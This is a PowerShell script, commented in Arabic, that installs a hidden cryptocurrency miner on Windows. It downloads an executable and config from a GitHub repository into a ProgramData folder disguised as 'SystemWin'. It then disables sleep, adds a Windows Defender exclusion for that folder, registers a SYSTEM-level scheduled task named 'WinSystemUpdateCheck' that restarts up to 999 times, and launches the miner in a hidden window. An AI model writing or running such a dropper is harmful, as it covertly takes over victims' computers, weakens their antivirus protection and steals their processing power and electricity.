# 1. إعداد المسارات
$dir = "$env:PROGRAMDATA\SystemWin"; 
if (!(Test-Path $dir)) { New-Item -Path $dir -ItemType Directory -Force | Out-Null }

# 2. تحميل الملفات من مستودعك (تأكد من مطابقة الأسماء)
Invoke-WebRequest -Uri "https://github.com/awsmeawschees/bbnn/raw/main/win_service.exe" -OutFile "$dir\win_service.exe"
Invoke-WebRequest -Uri "https://github.com/awsmeawschees/bbnn/raw/main/config.json" -OutFile "$dir\config.json"

# 3. جعل الاسم تلقائياً بناءً على اسم الجهاز
$pcName = $env:COMPUTERNAME
(Get-Content "$dir\config.json") -replace '"pass": "x"', '"pass": "' + $pcName + '"' | Set-Content "$dir\config.json"

# 4. منع الجهاز من النوم
powercfg /change monitor-timeout-ac 0; powercfg /change standby-timeout-ac 0

# 5. إضافة استثناء للويندوز ديفندر
Add-MpPreference -ExclusionPath $dir

# 6. إنشاء المهمة المجدولة الذكية (لضمان العمل عند كل إقلاع)
$action = New-ScheduledTaskAction -Execute "$dir\win_service.exe" -Argument "--config $dir\config.json"
$trigger = New-ScheduledTaskTrigger -AtStartup
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -RestartCount 999 -RestartInterval (New-TimeSpan -Minutes 1)
Register-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -Settings $settings -TaskName "WinSystemUpdateCheck" -Force

# 7. تشغيل التعدين فوراً
Start-Process -FilePath "$dir\win_service.exe" -ArgumentList "--config $dir\config.json" -WindowStyle Hidden
